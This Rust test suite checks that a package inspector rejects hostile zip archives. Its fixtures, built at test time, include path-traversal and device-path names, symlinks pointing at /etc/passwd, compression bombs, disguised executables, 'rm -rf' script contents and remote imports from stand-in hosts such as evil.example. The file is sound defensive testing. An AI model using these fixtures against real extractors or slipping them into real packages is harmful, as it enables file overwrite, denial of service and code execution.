//! Non-negotiable package security suite (PKG-001, PKG-002).
//!
//! Every fixture is generated at test time by `support::build_zip`; nothing is
//! committed. Each hostile case calls `inspect_archive_in` and asserts:
//!
//! 1. the specific stable error code (and path rule, where relevant), and
//! 2. that the sandbox tree is unchanged afterwards: the staging root is empty
//!    again and nothing was written anywhere else.
//!
//! The fixture list and expected codes are documented in
//! `docs/security/package-fixtures.md`. Run with
//! `cargo test -p glint-package --test security`.

mod support;

use std::path::Path;

use glint_package::{
    ErrorCode as C, PackageError, PackageLimits, PathRejection as P, inspect_archive_in,
};
use glint_schema::ErrorCode as M;
use sha2::{Digest, Sha256};
use support::*;

fn assert_rejected_without_writes(bytes: &[u8], limits: &PackageLimits) -> PackageError {
    let sandbox = Sandbox::new(bytes);
    let before = sandbox.snapshot();
    let error = inspect_archive_in(&sandbox.archive, limits, &sandbox.staging_root)
        .expect_err("hostile fixture must be rejected");
    assert_eq!(
        sandbox.snapshot(),
        before,
        "rejection must leave no file behind (error: {error})"
    );
    assert_eq!(
        std::fs::read_dir(&sandbox.staging_root).unwrap().count(),
        0,
        "staging root must be empty after a rejection"
    );
    error
}

macro_rules! rejects {
    ($name:ident, $bytes:expr, limits = $limits:expr, $code:ident $(, $reason:ident)?) => {
        #[test]
        fn $name() {
            let bytes: Vec<u8> = $bytes;
            let error = assert_rejected_without_writes(&bytes, &$limits);
            assert_eq!(error.code(), C::$code, "unexpected error: {error}");
            $(assert_eq!(error.path_rejection(), Some(P::$reason), "unexpected rule: {error}");)?
        }
    };
    ($name:ident, $bytes:expr, $code:ident $(, $reason:ident)?) => {
        rejects!($name, $bytes, limits = PackageLimits::default(), $code $(, $reason)?);
    };
}

macro_rules! rejects_manifest {
    ($name:ident, $bytes:expr, $manifest_code:ident) => {
        #[test]
        fn $name() {
            let bytes: Vec<u8> = $bytes;
            let error = assert_rejected_without_writes(&bytes, &PackageLimits::default());
            assert_eq!(
                error.code(),
                C::InvalidManifest,
                "unexpected error: {error}"
            );
            assert_eq!(
                error.manifest_error().map(|e| e.code()),
                Some(M::$manifest_code),
                "unexpected manifest code: {error}"
            );
        }
    };
}

fn path(name: &[u8]) -> Vec<u8> {
    good_plus(vec![RawEntry::stored(name, "x")])
}

fn non_ascii_limits() -> PackageLimits {
    PackageLimits {
        ascii_paths_only: false,
        ..PackageLimits::default()
    }
}

// ---- Path traversal, absolute, UNC and device paths -------------------------

rejects!(
    traversal_parent_dir,
    path(b"../escaped.txt"),
    UnsafePath,
    ParentDir
);
rejects!(
    traversal_nested_parent_dir,
    path(b"dist/../../escaped.txt"),
    UnsafePath,
    ParentDir
);
rejects!(
    traversal_backslash_parent_dir,
    path(b"..\\escaped.txt"),
    UnsafePath,
    Backslash
);
rejects!(
    absolute_posix_path,
    path(b"/tmp/escaped.txt"),
    UnsafePath,
    Absolute
);
rejects!(
    absolute_backslash_root,
    path(b"\\Windows\\escaped.txt"),
    UnsafePath,
    Absolute
);
rejects!(
    absolute_windows_drive,
    path(b"C:\\Windows\\escaped.txt"),
    UnsafePath,
    DriveOrColon
);
rejects!(
    absolute_windows_drive_forward_slash,
    path(b"C:/Windows/escaped.txt"),
    UnsafePath,
    DriveOrColon
);
rejects!(
    drive_relative_path,
    path(b"C:escaped.txt"),
    UnsafePath,
    DriveOrColon
);
rejects!(
    drive_prefix_inside_path,
    path(b"dist/c:escaped.txt"),
    UnsafePath,
    DriveOrColon
);
rejects!(
    ntfs_alternate_data_stream,
    path(b"glint.json:hidden"),
    UnsafePath,
    DriveOrColon
);
rejects!(
    unc_path_backslash,
    path(b"\\\\server\\share\\escaped.txt"),
    UnsafePath,
    UncOrDevicePath
);
rejects!(
    unc_path_forward_slash,
    path(b"//server/share/escaped.txt"),
    UnsafePath,
    UncOrDevicePath
);
rejects!(
    device_namespace_path,
    path(b"\\\\.\\PhysicalDrive0"),
    UnsafePath,
    UncOrDevicePath
);
rejects!(
    verbatim_path,
    path(b"\\\\?\\C:\\escaped.txt"),
    UnsafePath,
    UncOrDevicePath
);
rejects!(
    backslash_separator,
    path(b"dist\\panel\\x.js"),
    UnsafePath,
    Backslash
);
rejects!(current_dir_component, path(b"./x.txt"), UnsafePath, CurDir);
rejects!(
    empty_component,
    path(b"dist//x.txt"),
    UnsafePath,
    EmptyComponent
);
rejects!(empty_name, path(b""), UnsafePath, Empty);
rejects!(
    nul_byte_in_name,
    path(b"x.txt\0.png"),
    UnsafePath,
    ControlChar
);
rejects!(
    control_char_in_name,
    path(b"x\x07.txt"),
    UnsafePath,
    ControlChar
);
rejects!(
    non_utf8_name,
    path(&[b'a', 0x81, 0xFE, b'.', b't']),
    UnsafePath,
    NotUtf8
);
rejects!(
    non_ascii_name_by_default,
    path("caf\u{e9}.png".as_bytes()),
    UnsafePath,
    NonAscii
);

// ---- Windows device names and namespace quirks ------------------------------

rejects!(
    device_name_con,
    path(b"CON"),
    UnsafePath,
    ReservedDeviceName
);
rejects!(
    device_name_nul_with_extension,
    path(b"assets/nul.txt"),
    UnsafePath,
    ReservedDeviceName
);
rejects!(
    device_name_com1_json,
    path(b"COM1.json"),
    UnsafePath,
    ReservedDeviceName
);
rejects!(
    device_name_lpt9_dir,
    path(b"lpt9/x.txt"),
    UnsafePath,
    ReservedDeviceName
);
rejects!(
    device_name_conin,
    path(b"CONIN$"),
    UnsafePath,
    ReservedDeviceName
);
rejects!(
    device_name_superscript_com,
    path("COM\u{b9}.txt".as_bytes()),
    limits = non_ascii_limits(),
    UnsafePath,
    ReservedDeviceName
);
rejects!(
    trailing_dot_component,
    path(b"assets/x.txt."),
    UnsafePath,
    TrailingDotOrSpace
);
rejects!(
    trailing_space_component,
    path(b"assets /x.txt"),
    UnsafePath,
    TrailingDotOrSpace
);
rejects!(
    leading_space_component,
    path(b"assets/ x.txt"),
    UnsafePath,
    TrailingDotOrSpace
);
rejects!(
    short_name_alias,
    path(b"PROGRA~1/x.txt"),
    UnsafePath,
    ForbiddenChar
);
rejects!(
    wildcard_char,
    path(b"assets/*.txt"),
    UnsafePath,
    ForbiddenChar
);

// ---- Depth and length --------------------------------------------------------

rejects!(
    deep_nesting,
    path(format!("{}x.txt", "d/".repeat(16)).as_bytes()),
    UnsafePath,
    TooDeep
);
rejects!(
    path_too_long,
    path("a".repeat(241).as_bytes()),
    UnsafePath,
    TooLong
);
rejects!(
    component_too_long,
    path(format!("dist/{}", "a".repeat(129)).as_bytes()),
    UnsafePath,
    ComponentTooLong
);

// ---- Symlinks, hardlinks, special files and extra fields ---------------------

rejects!(
    symlink_unix_mode,
    good_plus(vec![
        RawEntry::stored("dist/link", "../../escaped.txt").unix_mode(S_IFLNK | 0o777)
    ]),
    Symlink
);
rejects!(
    // The zip crate ignores the high 16 bits for MS-DOS hosts (is_symlink() is
    // false); the reader checks the raw bits regardless of host.
    symlink_bits_on_dos_host,
    good_plus(vec![
        RawEntry::stored("dist/link", "../../escaped.txt").external((S_IFLNK | 0o777) << 16)
    ]),
    Symlink
);
rejects!(
    symlink_bits_on_ntfs_host,
    good_plus(vec![
        RawEntry::stored("dist/link", "../../escaped.txt")
            .host(HOST_NTFS)
            .external((S_IFLNK | 0o777) << 16)
    ]),
    Symlink
);
rejects!(
    symlink_directory_entry,
    good_plus(vec![
        RawEntry::stored("dist/linkdir/", "").unix_mode(S_IFLNK | 0o777)
    ]),
    Symlink
);
rejects!(
    character_device_mode,
    good_plus(vec![
        RawEntry::stored("dist/dev", "").unix_mode(S_IFCHR | 0o666)
    ]),
    NotRegularFile
);
rejects!(
    fifo_mode,
    good_plus(vec![
        RawEntry::stored("dist/fifo", "").unix_mode(S_IFIFO | 0o666)
    ]),
    NotRegularFile
);
rejects!(
    unicode_path_extra_field,
    {
        // Info-ZIP Unicode Path (0x7075): version 1, CRC32 of the header name, new name.
        let header_name = b"dist/panel/safe.js";
        let mut payload = vec![1u8];
        payload.extend_from_slice(&crc32fast::hash(header_name).to_le_bytes());
        payload.extend_from_slice(b"../escaped.txt");
        good_plus(vec![
            RawEntry::stored(header_name, "x").extra_field(0x7075, &payload),
        ])
    },
    // With the UTF-8 flag set, zip 9.8.1's header-consistency check fires first.
    Malformed
);
rejects!(
    unicode_path_extra_field_case_rename,
    {
        // A case-only rename without the UTF-8 flag passes the crate's header
        // consistency rules, so only the extra-field allow-list catches it.
        let header_name = b"dist/panel/safe.js";
        let mut payload = vec![1u8];
        payload.extend_from_slice(&crc32fast::hash(header_name).to_le_bytes());
        payload.extend_from_slice(b"dist/panel/SAFE.js");
        good_plus(vec![
            RawEntry::stored(header_name, "x")
                .flags(0)
                .extra_field(0x7075, &payload),
        ])
    },
    ForbiddenExtraField
);
rejects!(
    pkware_unix_extra_field_link_target,
    // 0x000d carries atime/mtime/uid/gid then a symlink or hardlink target.
    good_plus(vec![
        RawEntry::stored("dist/x.txt", "x").extra_field(
            0x000d,
            &[0u8; 12]
                .iter()
                .copied()
                .chain(*b"/etc/passwd")
                .collect::<Vec<_>>()
        )
    ]),
    ForbiddenExtraField
);
rejects!(
    unknown_extra_field,
    good_plus(vec![
        RawEntry::stored("dist/x.txt", "x").extra_field(0xCAFE, b"payload")
    ]),
    ForbiddenExtraField
);

// ---- Duplicates and collisions -------------------------------------------------

rejects!(
    exact_duplicate_names,
    good_plus(vec![RawEntry::stored(
        "theme/tokens.json",
        r#"{"color":"red"}"#
    )]),
    DuplicateName
);
rejects!(
    case_fold_duplicate,
    good_plus(vec![
        RawEntry::stored("assets/A.txt", "a"),
        RawEntry::stored("assets/a.txt", "b")
    ]),
    PathCollision
);
rejects!(
    case_fold_manifest_shadow,
    good_plus(vec![RawEntry::stored("GLINT.JSON", "{}")]),
    PathCollision
);
rejects!(
    case_fold_directory_collision,
    good_plus(vec![RawEntry::stored("Dist/panel/index.html", "x")]),
    PathCollision
);
rejects!(
    file_and_directory_same_path,
    good_plus(vec![
        RawEntry::stored("assets", "file"),
        RawEntry::stored("assets/x.txt", "x")
    ]),
    PathCollision
);
rejects!(
    file_shadows_directory_case_folded,
    good_plus(vec![
        RawEntry::stored("Assets", "file"),
        RawEntry::stored("assets/x.txt", "x")
    ]),
    PathCollision
);
rejects!(
    overlapping_entries_share_data,
    {
        let mut entries = good_entries();
        let index = entries.len();
        entries.push(RawEntry::deflated("assets/one.bin", vec![b'a'; 4096]));
        entries.push(RawEntry::stored("assets/two.bin", "").reuse_local_of(index));
        build_zip(&entries)
    },
    OverlappingEntries
);
rejects!(
    local_and_central_names_differ,
    good_plus(vec![
        RawEntry::stored("assets/safe.txt", "x").local_name("../escaped.txt")
    ]),
    Malformed
);
rejects!(
    local_entry_hidden_from_central_directory,
    good_plus(vec![
        RawEntry::stored("../escaped.txt", "x").hidden_from_central()
    ]),
    Malformed
);

// ---- Compression bombs and size budgets ---------------------------------------

rejects!(
    high_compression_ratio,
    // 8 MiB of zeros deflates to ~8 KiB (ratio ~1000). Generated, never committed.
    good_plus(vec![RawEntry::deflated(
        "assets/zeros.bin",
        vec![0u8; 8 * MIB]
    )]),
    RatioExceeded
);
rejects!(
    archive_wide_ratio_from_small_entries,
    // Each entry is below `ratio_min_bytes`; the archive-wide ratio still trips.
    good_plus(
        (0..8)
            .map(|i| RawEntry::deflated(format!("assets/z{i}.bin"), vec![0u8; MIB / 2]))
            .collect()
    ),
    RatioExceeded
);
rejects!(
    declared_size_understated,
    // Declares 1000 bytes (dodging the ratio check) but inflates to 4 MiB.
    good_plus(vec![
        RawEntry::deflated("assets/liar.bin", vec![0u8; 4 * MIB]).declared(1000)
    ]),
    Malformed
);
rejects!(
    declared_size_overstated,
    good_plus(vec![
        RawEntry::deflated("assets/liar.bin", b"tiny").declared(5000)
    ]),
    SizeMismatch
);
rejects!(
    stored_sizes_disagree,
    good_plus(vec![
        RawEntry::stored("assets/liar.bin", "0123456789").declared(4)
    ]),
    SizeMismatch
);
rejects!(
    entry_too_large,
    good_plus(vec![RawEntry::stored("assets/big.bin", noise(2 * MIB))]),
    limits = PackageLimits {
        max_file_uncompressed: MIB as u64,
        ..PackageLimits::default()
    },
    EntryTooLarge
);
rejects!(
    total_too_large,
    good_plus(
        (0..4)
            .map(|i| RawEntry::stored(format!("assets/n{i}.bin"), noise(MIB / 2)))
            .collect()
    ),
    limits = PackageLimits {
        max_total_uncompressed: MIB as u64,
        ..PackageLimits::default()
    },
    TotalTooLarge
);
rejects!(
    archive_file_too_large,
    good_plus(vec![RawEntry::stored("assets/big.bin", noise(MIB))]),
    limits = PackageLimits {
        max_archive_bytes: 512 * 1024,
        ..PackageLimits::default()
    },
    ArchiveTooLarge
);
rejects!(
    excessive_entry_count,
    good_plus(
        (0..10_001)
            .map(|i| RawEntry::stored(format!("assets/{i}.txt"), ""))
            .collect()
    ),
    TooManyEntries
);
rejects!(
    entry_count_above_custom_limit,
    build_zip(&good_entries()),
    limits = PackageLimits {
        max_entries: 3,
        ..PackageLimits::default()
    },
    TooManyEntries
);
rejects!(
    end_of_central_directory_claims_too_many_entries,
    {
        // The EOCD count is checked before the crate parses the directory.
        let mut bytes = build_zip(&good_entries());
        let eocd = eocd_offset(&bytes);
        bytes[eocd + 8..eocd + 12].copy_from_slice(&[0x50, 0xC3, 0x50, 0xC3]); // 50_000
        bytes
    },
    TooManyEntries
);
rejects!(
    scanned_text_too_large,
    with_file("dist/panel/main.js", &"x();".repeat(1024)),
    limits = PackageLimits {
        max_scanned_text_bytes: 1024,
        ..PackageLimits::default()
    },
    TextTooLarge
);

// ---- Encryption and compression methods --------------------------------------

rejects!(
    zipcrypto_encrypted_entry,
    good_plus(vec![
        RawEntry::stored("assets/secret.bin", [0u8; 24]).flags(FLAG_UTF8 | FLAG_ENCRYPTED)
    ]),
    Encrypted
);
rejects!(
    strong_encryption_flag,
    good_plus(vec![
        RawEntry::stored("assets/secret.bin", [0u8; 24])
            .flags(FLAG_UTF8 | FLAG_ENCRYPTED | FLAG_STRONG_ENCRYPTION)
    ]),
    Encrypted
);
rejects!(
    aes_encrypted_entry,
    // Method 99 + AE-x extra field (vendor version 2, "AE", AES-256, inner method 8).
    good_plus(vec![
        RawEntry::stored("assets/secret.bin", [0u8; 32])
            .flags(FLAG_UTF8 | FLAG_ENCRYPTED)
            .method(99)
            .extra_field(0x9901, &[2, 0, b'A', b'E', 3, 8, 0])
    ]),
    ForbiddenExtraField
);
rejects!(
    aes_method_without_extra_field,
    good_plus(vec![
        RawEntry::stored("assets/secret.bin", [0u8; 32]).method(99)
    ]),
    UnsupportedCompression
);
rejects!(
    bzip2_method,
    good_plus(vec![RawEntry::stored("assets/x.bin", [0u8; 32]).method(12)]),
    UnsupportedCompression
);
rejects!(
    lzma_method,
    good_plus(vec![RawEntry::stored("assets/x.bin", [0u8; 32]).method(14)]),
    UnsupportedCompression
);

// ---- Envelope: magic bytes and directory records -----------------------------

rejects!(
    not_a_zip_text,
    b"this is not a zip archive at all".to_vec(),
    NotZip
);
rejects!(
    not_a_zip_png,
    b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR".to_vec(),
    NotZip
);
rejects!(empty_file, Vec::<u8>::new(), NotZip);
rejects!(
    polyglot_prepended_executable,
    // The zip crate's default ArchiveOffset::Detect would open this.
    [b"MZ\x90\0fake-pe-stub".to_vec(), build_zip(&good_entries())].concat(),
    NotZip
);
rejects!(
    truncated_archive,
    build_zip(&good_entries())[..60].to_vec(),
    Malformed
);
rejects!(
    zip64_end_of_central_directory_marker,
    {
        // EOCD entry-count fields set to 0xFFFF ("see ZIP64 record").
        let mut bytes = build_zip(&good_entries());
        let eocd = eocd_offset(&bytes);
        bytes[eocd + 8..eocd + 12].copy_from_slice(&[0xFF; 4]);
        bytes
    },
    UnsupportedArchiveFeature
);
rejects!(
    zip64_locator_before_end_record,
    {
        let bytes = build_zip(&good_entries());
        let eocd = eocd_offset(&bytes);
        let mut locator = b"PK\x06\x07".to_vec();
        locator.extend_from_slice(&[0u8; 16]);
        [&bytes[..eocd], &locator, &bytes[eocd..]].concat()
    },
    UnsupportedArchiveFeature
);
rejects!(
    multi_disk_archive,
    {
        let mut bytes = build_zip(&good_entries());
        let eocd = eocd_offset(&bytes);
        bytes[eocd + 4..eocd + 6].copy_from_slice(&1u16.to_le_bytes());
        bytes
    },
    UnsupportedArchiveFeature
);
rejects!(
    archive_comment,
    {
        let mut bytes = build_zip(&good_entries());
        let eocd = eocd_offset(&bytes);
        bytes[eocd + 20..eocd + 22].copy_from_slice(&7u16.to_le_bytes());
        bytes.extend_from_slice(b"comment");
        bytes
    },
    UnsupportedArchiveFeature
);
rejects!(
    trailing_data_after_end_record,
    [build_zip(&good_entries()), b"trailing junk".to_vec()].concat(),
    Malformed
);
rejects!(
    planted_end_record_in_comment,
    {
        // The real EOCD gets a 22-byte comment holding a second, fake EOCD
        // that copies the real one; a reader that takes the last signature
        // must still notice the central directory does not end there.
        let mut bytes = build_zip(&good_entries());
        let eocd = eocd_offset(&bytes);
        let fake = bytes[eocd..].to_vec();
        bytes[eocd + 20..eocd + 22].copy_from_slice(&22u16.to_le_bytes());
        bytes.extend_from_slice(&fake);
        bytes
    },
    Malformed
);
rejects!(
    data_descriptor_flag,
    good_plus(vec![
        RawEntry::stored("assets/streamed.txt", "x").flags(FLAG_UTF8 | FLAG_DATA_DESCRIPTOR)
    ]),
    UnsupportedArchiveFeature
);
rejects!(
    masked_local_headers_flag,
    good_plus(vec![
        RawEntry::stored("assets/masked.txt", "x").flags(FLAG_UTF8 | FLAG_MASKED_HEADERS)
    ]),
    UnsupportedArchiveFeature
);

// ---- Executables and scripts (rejected, never run) -----------------------------

rejects!(
    executable_extension,
    good_plus(vec![RawEntry::stored("dist/tool.exe", "x")]),
    ExecutableContent
);
rejects!(
    script_extension,
    good_plus(vec![RawEntry::stored("install.ps1", "Remove-Item")]),
    ExecutableContent
);
rejects!(
    shell_script_extension,
    good_plus(vec![RawEntry::stored("postinstall.sh", "rm -rf")]),
    ExecutableContent
);
rejects!(
    wasm_module_extension,
    good_plus(vec![RawEntry::stored("dist/panel/app.wasm", "x")]),
    ExecutableContent
);
rejects!(
    pe_magic_disguised_as_png,
    good_plus(vec![RawEntry::stored("assets/image.png", b"MZ\x90\0\x03")]),
    ExecutableContent
);
rejects!(
    elf_magic_disguised,
    good_plus(vec![RawEntry::stored(
        "assets/data.bin",
        b"\x7fELF\x02\x01"
    )]),
    ExecutableContent
);
rejects!(
    macho_magic_disguised,
    good_plus(vec![RawEntry::stored(
        "assets/data.bin",
        [0xCF, 0xFA, 0xED, 0xFE, 7, 0, 0, 1]
    )]),
    ExecutableContent
);
rejects!(
    wasm_magic_disguised,
    good_plus(vec![RawEntry::stored(
        "assets/data.bin",
        b"\0asm\x01\0\0\0"
    )]),
    ExecutableContent
);
rejects!(
    shebang_script_disguised_as_text,
    good_plus(vec![RawEntry::deflated(
        "assets/readme.txt",
        "#!/bin/sh\ntouch escaped.txt\n"
    )]),
    ExecutableContent
);

// ---- Manifest and capabilities ------------------------------------------------

rejects!(
    missing_manifest,
    build_zip(&good_entries()[1..]),
    MissingManifest
);
rejects!(
    manifest_only_in_subdirectory,
    {
        let mut entries = good_entries();
        entries[0] = RawEntry::deflated("theme/glint.json", GOOD_MANIFEST);
        build_zip(&entries)
    },
    MissingManifest
);
rejects!(
    manifest_not_utf8,
    {
        let mut entries = good_entries();
        entries[0] = RawEntry::deflated("glint.json", b"{\"name\": \"\xff\xfe\"}");
        build_zip(&entries)
    },
    ManifestNotUtf8
);
rejects_manifest!(manifest_not_json, with_manifest("{ not json"), InvalidJson);
rejects_manifest!(
    manifest_wrong_schema_version,
    with_manifest(&GOOD_MANIFEST.replace("\"schemaVersion\": 1", "\"schemaVersion\": 99")),
    UnsupportedSchemaVersion
);
rejects_manifest!(
    manifest_wrong_kind,
    with_manifest(&GOOD_MANIFEST.replace("\"kind\": \"theme\"", "\"kind\": \"plugin\"")),
    WrongKind
);
rejects_manifest!(
    manifest_missing_id,
    with_manifest(&GOOD_MANIFEST.replace("\"id\": \"dev.example.fixture\",", "")),
    MissingId
);
rejects_manifest!(
    manifest_duplicate_key,
    with_manifest(&GOOD_MANIFEST.replace(
        "\"name\": \"Fixture\",",
        "\"name\": \"Fixture\", \"name\": \"Shadow\","
    )),
    DuplicateKey
);
rejects_manifest!(
    manifest_remote_entrypoint,
    with_manifest(
        &GOOD_MANIFEST.replace("dist/panel/index.html", "https://evil.example/panel.html")
    ),
    InvalidPath
);
rejects_manifest!(
    manifest_traversal_reference,
    with_manifest(&GOOD_MANIFEST.replace("theme/tokens.json", "../tokens.json")),
    InvalidPath
);
rejects_manifest!(
    capability_outside_known_namespace,
    with_manifest(&GOOD_MANIFEST.replace("\"system.audio.read\"", "\"filesystem.write.any\"")),
    InvalidCapability
);
rejects!(
    unknown_required_capability,
    with_manifest(&GOOD_MANIFEST.replace("\"surface.panel\"", "\"system.shell.exec\"")),
    UnknownCapability
);
rejects!(
    unknown_optional_capability,
    with_manifest(&GOOD_MANIFEST.replace("\"system.audio.read\"", "\"system.files.write\"")),
    UnknownCapability
);
rejects!(
    manifest_references_missing_file,
    with_manifest(&GOOD_MANIFEST.replace("theme/tokens.json", "theme/missing.json")),
    MissingReferencedFile
);
rejects!(
    manifest_references_directory,
    with_manifest(
        &GOOD_MANIFEST.replace("\"tokens\": \"theme/tokens.json\"", "\"tokens\": \"theme\"")
    ),
    MissingReferencedFile
);
rejects!(
    manifest_references_missing_asset,
    with_manifest(&GOOD_MANIFEST.replace(
        "\"tokens\":",
        "\"assets\": { \"wallpaper\": \"assets/wallpaper.png\" }, \"tokens\":"
    )),
    MissingReferencedFile
);
rejects!(
    manifest_reference_differs_in_case,
    with_manifest(&GOOD_MANIFEST.replace("theme/tokens.json", "theme/Tokens.json")),
    MissingReferencedFile
);

// ---- Remote references in UI entrypoints --------------------------------------

rejects!(
    remote_script_src,
    with_file(
        "dist/panel/index.html",
        r#"<html><head><script src="https://cdn.example.com/lib.js"></script></head></html>"#
    ),
    RemoteReference
);
rejects!(
    protocol_relative_script_src,
    with_file(
        "dist/panel/index.html",
        r#"<html><SCRIPT SRC='//cdn.example.com/lib.js'></SCRIPT></html>"#
    ),
    RemoteReference
);
rejects!(
    remote_stylesheet_link,
    with_file(
        "dist/panel/index.html",
        r#"<html><link rel="stylesheet" href="https://fonts.example.com/x.css"></html>"#
    ),
    RemoteReference
);
rejects!(
    remote_iframe,
    with_file(
        "dist/panel/index.html",
        r#"<html><iframe src=http://tracker.example/></iframe></html>"#
    ),
    RemoteReference
);
rejects!(
    meta_refresh_redirect,
    with_file(
        "dist/panel/index.html",
        r#"<html><meta http-equiv="refresh" content="0;url=https://evil.example"></html>"#
    ),
    RemoteReference
);
rejects!(
    css_remote_import,
    good_plus(vec![RawEntry::stored(
        "dist/panel/style.css",
        "@import url(\"https://fonts.example.com/f.css\");"
    )]),
    RemoteReference
);
rejects!(
    js_static_remote_import,
    with_file(
        "dist/panel/main.js",
        "import React from 'https://esm.sh/react@19';"
    ),
    RemoteReference
);
rejects!(
    js_dynamic_remote_import,
    with_file(
        "dist/panel/main.js",
        "const m = await import(\"https://evil.example/m.js\");"
    ),
    RemoteReference
);
rejects!(
    unc_reference_in_html,
    with_file(
        "dist/panel/index.html",
        r#"<html><img src="\\attacker\share\pixel.png"></html>"#
    ),
    RemoteReference
);

// ---- Source and staging discipline --------------------------------------------

#[test]
fn source_that_is_a_directory_is_refused() {
    let sandbox = Sandbox::new(b"");
    let before = sandbox.snapshot();
    let directory = sandbox.dir.path().join("input");
    let error = inspect_archive_in(&directory, &PackageLimits::default(), &sandbox.staging_root)
        .expect_err("a directory is not an archive");
    // Windows refuses to open a directory as a file (I/O error); elsewhere the
    // open succeeds and the metadata check refuses it.
    assert!(
        matches!(error.code(), C::SourceNotFile | C::Io),
        "unexpected error: {error}"
    );
    assert_eq!(sandbox.snapshot(), before);
}

#[test]
fn missing_staging_root_is_refused_without_creating_it() {
    let sandbox = Sandbox::new(&build_zip(&good_entries()));
    let missing = sandbox.dir.path().join("no-such-root");
    let before = sandbox.snapshot();
    let error = inspect_archive_in(&sandbox.archive, &PackageLimits::default(), &missing)
        .expect_err("missing staging root must be refused");
    assert_eq!(error.code(), C::StagingRootInvalid, "{error}");
    assert_eq!(sandbox.snapshot(), before);
}

#[test]
fn staging_root_that_is_a_file_is_refused() {
    let sandbox = Sandbox::new(&build_zip(&good_entries()));
    let error = inspect_archive_in(
        &sandbox.archive,
        &PackageLimits::default(),
        &sandbox.archive,
    )
    .expect_err("a file is not a staging root");
    assert_eq!(error.code(), C::StagingRootInvalid, "{error}");
}

#[cfg(unix)]
#[test]
fn symlinked_staging_root_is_refused() {
    let sandbox = Sandbox::new(&build_zip(&good_entries()));
    let link = sandbox.dir.path().join("link-root");
    std::os::unix::fs::symlink(&sandbox.staging_root, &link).unwrap();
    let error = inspect_archive_in(&sandbox.archive, &PackageLimits::default(), &link)
        .expect_err("a symlinked staging root must be refused");
    assert_eq!(error.code(), C::StagingRootInvalid, "{error}");
}

#[cfg(unix)]
#[test]
fn world_writable_staging_root_is_refused() {
    use std::os::unix::fs::PermissionsExt;
    let sandbox = Sandbox::new(&build_zip(&good_entries()));
    std::fs::set_permissions(
        &sandbox.staging_root,
        std::fs::Permissions::from_mode(0o777),
    )
    .unwrap();
    let error = inspect_archive_in(
        &sandbox.archive,
        &PackageLimits::default(),
        &sandbox.staging_root,
    )
    .expect_err("a world-writable staging root must be refused");
    assert_eq!(error.code(), C::StagingRootInvalid, "{error}");
}

fn files_under(root: &Path) -> Vec<String> {
    fn walk(root: &Path, dir: &Path, out: &mut Vec<String>) {
        for entry in std::fs::read_dir(dir).unwrap() {
            let entry = entry.unwrap();
            let path = entry.path();
            if entry.file_type().unwrap().is_dir() {
                walk(root, &path, out);
            } else {
                out.push(
                    path.strip_prefix(root)
                        .unwrap()
                        .to_string_lossy()
                        .replace('\\', "/"),
                );
            }
        }
    }
    let mut out = Vec::new();
    walk(root, root, &mut out);
    out.sort();
    out
}

#[test]
fn good_package_extracts_read_only_with_matching_hashes() {
    let bytes = build_zip(&good_entries());
    let sandbox = Sandbox::new(&bytes);
    let candidate = inspect_archive_in(
        &sandbox.archive,
        &PackageLimits::default(),
        &sandbox.staging_root,
    )
    .expect("baseline package must be accepted");

    assert_eq!(candidate.manifest.id, "dev.example.fixture");
    assert_eq!(candidate.sha256, <[u8; 32]>::from(Sha256::digest(&bytes)));
    assert_eq!(candidate.sha256_hex().len(), 64);
    assert_eq!(candidate.archive_size, bytes.len() as u64);
    assert_eq!(std::fs::read(&candidate.source_copy).unwrap(), bytes);
    assert_eq!(candidate.files.len(), 5);
    assert_eq!(candidate.directories, vec!["theme".to_owned()]);
    assert!(candidate.extracted_root.starts_with(&sandbox.staging_root));

    for file in &candidate.files {
        let on_disk_path = candidate.extracted_root.join(&file.path);
        let on_disk = std::fs::read(&on_disk_path).unwrap();
        assert_eq!(on_disk.len() as u64, file.size);
        assert_eq!(
            <[u8; 32]>::from(Sha256::digest(&on_disk)),
            file.sha256,
            "{}",
            file.path
        );
        let meta = std::fs::metadata(&on_disk_path).unwrap();
        assert!(meta.permissions().readonly(), "{} is writable", file.path);
    }
    assert!(
        std::fs::metadata(&candidate.source_copy)
            .unwrap()
            .permissions()
            .readonly()
    );
    assert_eq!(
        files_under(&candidate.extracted_root),
        vec![
            "dist/panel/dep.js",
            "dist/panel/index.html",
            "dist/panel/main.js",
            "glint.json",
            "theme/tokens.json",
        ]
    );
    // Nothing outside the staging root changed.
    let outside: Vec<String> = sandbox
        .snapshot()
        .into_iter()
        .filter(|p| !p.starts_with("staging/"))
        .collect();
    assert_eq!(outside, vec!["input", "input/fixture.glint", "staging"]);

    drop(candidate);
    assert_eq!(
        std::fs::read_dir(&sandbox.staging_root).unwrap().count(),
        0,
        "dropping the candidate removes its staging directory"
    );
}

#[test]
fn keep_staging_leaves_the_directory_for_the_installer() {
    let sandbox = Sandbox::new(&build_zip(&good_entries()));
    let mut candidate = inspect_archive_in(
        &sandbox.archive,
        &PackageLimits::default(),
        &sandbox.staging_root,
    )
    .unwrap();
    candidate.keep_staging();
    let staging_dir = candidate.staging_dir().to_path_buf();
    drop(candidate);
    assert!(staging_dir.join("root").join("glint.json").is_file());
    remove_read_only_tree(&staging_dir);
}

/// Test cleanup for a kept (read-only) staging directory.
#[allow(clippy::permissions_set_readonly_false)]
fn remove_read_only_tree(dir: &Path) {
    fn writable(path: &Path) {
        let meta = std::fs::symlink_metadata(path).unwrap();
        let mut permissions = meta.permissions();
        permissions.set_readonly(false);
        std::fs::set_permissions(path, permissions).unwrap();
        if meta.is_dir() {
            for entry in std::fs::read_dir(path).unwrap() {
                writable(&entry.unwrap().path());
            }
        }
    }
    writable(dir);
    std::fs::remove_dir_all(dir).unwrap();
}

#[test]
fn changing_the_source_after_inspection_does_not_affect_the_candidate() {
    let bytes = build_zip(&good_entries());
    let sandbox = Sandbox::new(&bytes);
    let candidate = inspect_archive_in(
        &sandbox.archive,
        &PackageLimits::default(),
        &sandbox.staging_root,
    )
    .unwrap();
    std::fs::write(&sandbox.archive, b"replaced by an attacker").unwrap();
    assert_eq!(std::fs::read(&candidate.source_copy).unwrap(), bytes);
    assert_eq!(
        <[u8; 32]>::from(Sha256::digest(
            std::fs::read(&candidate.source_copy).unwrap()
        )),
        candidate.sha256
    );
}

#[test]
fn each_inspection_gets_its_own_staging_directory() {
    let sandbox = Sandbox::new(&build_zip(&good_entries()));
    let limits = PackageLimits::default();
    let first = inspect_archive_in(&sandbox.archive, &limits, &sandbox.staging_root).unwrap();
    let second = inspect_archive_in(&sandbox.archive, &limits, &sandbox.staging_root).unwrap();
    assert_ne!(first.staging_dir(), second.staging_dir());
    assert_eq!(first.sha256, second.sha256);
}

